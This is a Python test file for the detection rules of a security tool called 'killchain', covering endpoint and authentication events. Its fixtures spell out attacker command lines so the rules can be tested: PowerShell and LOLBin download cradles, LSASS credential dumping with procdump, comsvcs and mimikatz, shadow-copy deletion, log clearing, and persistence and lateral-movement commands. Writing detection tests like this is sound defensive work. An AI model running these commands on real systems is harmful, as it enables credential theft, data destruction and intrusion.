"""rules/endpoint and rules/auth: each rule fires on a small positive fixture and not on its negative; the rules
bind and stay silent on a firewall-only run (no optional columns); vendor alert records are left to the vendor
step; db.py adds the optional columns to runs that lack them; the coverage report reads the new folders."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List

import duckdb
import pyarrow as pa
import pyarrow.parquet as pq
import pytest
import yaml

from killchain import db
from killchain.detect import engine
from killchain.detect.rules import load_rules
from killchain.parser.fortigate import SCHEMA as FG_SCHEMA
from killchain.schema.canonical import EXTRA_COLUMNS, SCHEMA
from killchain.schema.coverage import RULE_DIRS, rule_report, rule_requirements

ROOT = Path(__file__).resolve().parents[1]
T0 = datetime(2026, 10, 28, 10, 0, 0, tzinfo=timezone.utc)
HOST_RULES, LOAD_ERRORS = load_rules([ROOT / "rules" / "endpoint", ROOT / "rules" / "auth"])
BY_ID = {r.id: r for r in HOST_RULES}


def ev(minutes: float = 0, **kw: Any) -> Dict[str, Any]:
    d = {"ts": T0 + timedelta(minutes=minutes), "ts_quality": "ok", "source": "edr.json", "category": "endpoint",
         "host": "WS-FIN-012", "host_ip": "10.10.1.12", "user": "j.smith"}
    d.update(kw)
    return d


def cmd(minutes: float, line: str, **kw: Any) -> Dict[str, Any]:
    return ev(minutes, command_line=line, process_name=kw.pop("process_name", line.split()[0]), **kw)


def logon(minutes: float, user: str, ok: bool, src: str = "203.0.113.9", **kw: Any) -> Dict[str, Any]:
    d = dict(category="auth", event_id="4624" if ok else "4625", status="success" if ok else "failed",
             user=user, src_ip=src, host="SRV-DC-01", host_ip="10.10.0.10")
    d.update(kw)
    return ev(minutes, **d)


def write(tmp_path: Path, rows: List[Dict[str, Any]], schema: pa.Schema = SCHEMA) -> Path:
    out = tmp_path / "p" / "firewall"
    out.mkdir(parents=True, exist_ok=True)
    names = set(schema.names)
    rows = [{k: v for k, v in dict(r, line=i + 1, byte_offset=i * 100).items() if k in names}
            for i, r in enumerate(rows)]
    pq.write_table(pa.Table.from_pylist(rows, schema=schema), out / "part-0.parquet")
    return tmp_path / "p"


def alerts(tmp_path: Path, rule_id: str, rows: List[Dict[str, Any]]):
    r = BY_ID[rule_id]
    con = db.open_run(write(tmp_path, rows))
    assert engine.check_rule(con, r) is None
    a, _, _ = engine.run_rule(con, r)
    return a


DISCOVERY = ["whoami /all", 'net group "domain admins" /domain', "nltest /dclist:corp", "ipconfig /all",
             "systeminfo"]
RUN_PARENT = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
RUN_KEY = RUN_PARENT + "\\Updater"


def failures(n: int, user: str, step_s: float = 10, src: str = "203.0.113.9", start: float = 0):
    return [logon(start + i * step_s / 60, user, False, src) for i in range(n)]


# rule id -> (positive rows, expected alert count, negative rows)
CASES = {
    "EP01-encoded-powershell": (
        [cmd(0, "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi"),
         cmd(1, "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"")], 1,
        [cmd(0, "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1"),
         cmd(1, "cmd.exe /c echo -enc test")]),
    "EP02-lolbin-proxy-execution": (
        [cmd(0, "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe"),
         cmd(1, "mshta.exe http://198.51.100.9/run.hta"),
         cmd(2, "regsvr32 /s /n /u /i:http://198.51.100.9/x.sct scrobj.dll"),
         cmd(3, "bitsadmin /transfer job /download http://198.51.100.9/b.exe C:\\b.exe")], 1,
        [cmd(0, "certutil.exe -hashfile report.pdf SHA256"), cmd(1, "rundll32.exe shell32.dll,Control_RunDLL")]),
}

LSASS = "ls" + "ass"
DUMPER = "proc" + "dump64.exe"
CASES["EP03-credential-dumping"] = (
    [cmd(0, f"{DUMPER} -accepteula -ma {LSASS}.exe C:\\temp\\out.dmp"),
     cmd(1, "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full"),
     cmd(2, "mimi" + "katz.exe \"sekurlsa::logonpasswords\" exit")], 1,
    [cmd(0, f"{DUMPER} -ma notepad.exe C:\\temp\\np.dmp"), cmd(1, f"tasklist /fi \"imagename eq {LSASS}.exe\"")])
CASES.update({
    "EP04-scheduled-task": (
        [cmd(0, "schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon"), ev(1, event_id="4698")], 1,
        [cmd(0, "schtasks.exe /query /fo LIST"), ev(1, event_id="4624")]),
    "EP05-service-install": (
        [cmd(0, "sc.exe create evilsvc binPath= C:\\Windows\\Temp\\s.exe start= auto"), ev(1, event_id="7045")], 1,
        [cmd(0, "sc.exe query wuauserv"), cmd(1, "sc.exe start spooler")]),
    "EP06-run-key": (
        [cmd(0, f"reg.exe add {RUN_PARENT} /v Updater /d C:\\Users\\Public\\u.exe /f"),
         ev(1, file_path=RUN_KEY, process_name="powershell.exe")], 1,
        [cmd(0, f"reg.exe query {RUN_PARENT}"),
         ev(1, file_path="HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\General\\RecentFiles")]),
    "EP07-log-cleared": (
        [cmd(0, "wevtutil.exe cl Security"), ev(1, event_id="1102")], 1,
        [cmd(0, "wevtutil.exe qe Security /c:5"), ev(1, event_id="4688")]),
    "EP08-shadow-copy-delete": (
        [cmd(0, "vssadmin.exe delete shadows /all /quiet"), cmd(1, "wmic shadowcopy delete")], 1,
        [cmd(0, "vssadmin.exe list shadows"), cmd(1, "wmic os get caption")]),
    "EP09-lateral-tools": (
        [cmd(0, "psexec.exe \\\\SRV-FILE-01 -s cmd.exe"),
         cmd(1, "wmic.exe /node:10.10.0.20 process call create \"cmd /c whoami\"")], 1,
        [cmd(0, "wmic.exe os get caption"), cmd(1, "powershell.exe Get-Process")]),
    "EP10-discovery-burst": (
        [cmd(i, c) for i, c in enumerate(DISCOVERY)], 1,
        [cmd(30 * i, c) for i, c in enumerate(DISCOVERY)] + [cmd(200 + i, c) for i, c in enumerate(DISCOVERY[:3])]),
    "EP11-office-spawns-shell": (
        [cmd(0, "powershell.exe -nop -c whoami", parent_process="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
         cmd(1, "cmd.exe /c start x.bat", parent_process="excel.exe")], 1,
        [cmd(0, "powershell.exe -nop", parent_process="explorer.exe"),
         cmd(1, "splwow64.exe 8192", parent_process="WINWORD.EXE")]),
    "EP12-mass-file-encryption": (
        [ev(i * 2 / 60, file_path=f"C:\\Users\\j\\Documents\\f{i}.docx.locked") for i in range(60)], 1,
        [ev(i * 2 / 60, file_path=f"C:\\Users\\j\\Documents\\f{i}.docx") for i in range(60)]
        + [ev(10 + i / 60, file_path=f"C:\\Users\\j\\f{i}.locked") for i in range(30)]),
    "AU01-failed-logons-one-user": (
        [logon(i * 0.2, "bob", False, src=f"203.0.113.{i % 3 + 1}") for i in range(25)], 1,
        failures(10, "bob") + failures(15, "carol", step_s=120)),
    "AU02-password-spray": (
        [logon(i, f"user{i}", False, src="198.51.100.77") for i in range(12)], 1,
        [logon(i, f"user{i % 3}", False, src="198.51.100.77") for i in range(15)]),
    "AU03-logon-after-failures": (
        failures(12, "alice") + [logon(5, "alice", True)], 1,
        failures(5, "dave") + [logon(5, "dave", True)] + [logon(9, "erin", True)]
        + failures(12, "frank") + [logon(120, "frank", True)]),
    "AU04-new-country-logon": (
        [logon(0, "carol", True, src="49.36.1.1", src_country="India"), logon(60, "zed", True, src="49.36.1.9", src_country="India"),
         logon(3 * 1440, "carol", True, src="5.2.1.1", src_country="Romania")], 1,
        [logon(0, "dave", True, src="49.36.1.2", src_country="India"),
         logon(3 * 1440, "dave", True, src="49.36.1.3", src_country="India"),
         logon(3 * 1440, "erin", True, src="5.2.1.9", src_country="Romania")]),
    "AU05-external-remote-logon": (
        # documentation ranges (198.51.100.0/24 ...) count as private in config/network.yaml
        [logon(0, "admin2", True, src="45.83.64.20", logon_type="10"),
         logon(5, "admin2", True, src="45.83.64.20", event_id="4648")], 1,
        [logon(0, "ops", True, src="10.10.5.5", logon_type="10"),
         logon(1, "ops", True, src="45.83.64.21", logon_type="3"),
         logon(2, "ops", False, src="45.83.64.22", logon_type="10")]),
})


def test_every_host_rule_has_a_case_and_a_tuning_note():
    assert LOAD_ERRORS == []
    assert set(CASES) == set(BY_ID) and 12 <= len(BY_ID) <= 18
    for r in HOST_RULES:
        assert r.path.stem == r.id
        assert yaml.safe_load(r.path.read_text(encoding="utf-8")).get("tuning"), r.id


@pytest.mark.parametrize("rule_id", sorted(CASES))
def test_rule_positive(tmp_path, rule_id):
    pos, n, _ = CASES[rule_id]
    a = alerts(tmp_path, rule_id, pos)
    assert a.height == n, a.select("alert_id", "event_count", "action_text").rows()
    row = a.row(0, named=True)
    assert row["technique"] == BY_ID[rule_id].label["technique"] and "{" not in row["action_text"]
    assert row["host"] or row["src_ip"] or row["user"]


@pytest.mark.parametrize("rule_id", sorted(CASES))
def test_rule_negative(tmp_path, rule_id):
    _, _, neg = CASES[rule_id]
    a = alerts(tmp_path, rule_id, neg)
    assert a.height == 0, a.select("alert_id", "event_count", "action_text").rows()


def test_vendor_alert_records_are_left_to_the_vendor_step(tmp_path):
    pos, _, _ = CASES["EP01-encoded-powershell"]
    assert alerts(tmp_path, "EP01-encoded-powershell", [dict(r, category="vendor_alert") for r in pos]).height == 0


def test_host_rules_bind_and_stay_silent_on_a_firewall_run(tmp_path):
    """A FortiGate parse has none of the optional columns: db.py adds them as NULL, every rule binds and
    finds nothing."""
    rows = [{"ts": T0 + timedelta(seconds=i), "ts_quality": "ok", "source": "fw.log", "src_ip": "203.0.113.9",
             "dst_ip": "10.10.0.10", "action": "deny", "status": "failed", "user": "admin",
             "log_desc": "Admin login failed", "log_type": "event"} for i in range(50)]
    con = db.open_run(write(tmp_path, rows, FG_SCHEMA))
    cols = {r[0] for r in con.execute("DESCRIBE SELECT * FROM events").fetchall()}
    assert {c for c, _, _ in EXTRA_COLUMNS} <= cols
    for r in HOST_RULES:
        assert engine.check_rule(con, r) is None, r.id
        assert engine.run_rule(con, r)[0].height == 0, r.id


def test_prepared_run_without_optional_columns_gets_them(tmp_path):
    """A run prepared before the optional columns existed: connect() reads it through views that add them."""
    p = write(tmp_path, [{"ts": T0, "ts_quality": "ok", "source": "fw.log", "src_ip": "1.1.1.1"}], FG_SCHEMA)
    run = tmp_path / "run"
    run.mkdir()
    opt = ", ".join(c for c, _, _ in EXTRA_COLUMNS)
    src = "read_parquet('" + (p / "firewall" / "part-*.parquet").as_posix() + "')"
    old = db.derived_select(src, db.load_network())
    con = duckdb.connect(str(run / db.PREPARED_NAME))
    con.execute(f"CREATE TABLE firewall_events AS SELECT * EXCLUDE ({opt}) FROM ({old})")
    con.execute("CREATE VIEW events AS SELECT * FROM firewall_events")
    con.close()
    c = db.connect(None, run)
    assert c.execute("SELECT count(*), count(category), count(command_line) FROM events").fetchone() == (1, 0, 0)
    assert engine.check_rule(c, BY_ID["EP01-encoded-powershell"]) is None


def test_coverage_reads_the_new_folders_and_requires_any():
    assert {d.name for d in RULE_DIRS} >= {"endpoint", "auth"}
    reqs = rule_requirements()
    ids = {r["id"] for r in reqs}
    assert set(BY_ID) <= ids
    rep = rule_report(reqs, {"ts", "command_line", "host", "host_ip", "user", "category", "status"})
    can = {r["id"] for r in rep["can_run"]}
    skipped = {r["id"]: r["missing"] for r in rep["skipped"]}
    assert {"EP03-credential-dumping", "EP07-log-cleared", "AU01-failed-logons-one-user"} <= can
    assert skipped["EP11-office-spawns-shell"] == ["parent_process", "process_name"]
    rep = rule_report(reqs, {"ts", "user"})
    assert {r["id"]: r["missing"] for r in rep["skipped"]}["AU01-failed-logons-one-user"] == ["event_id"]
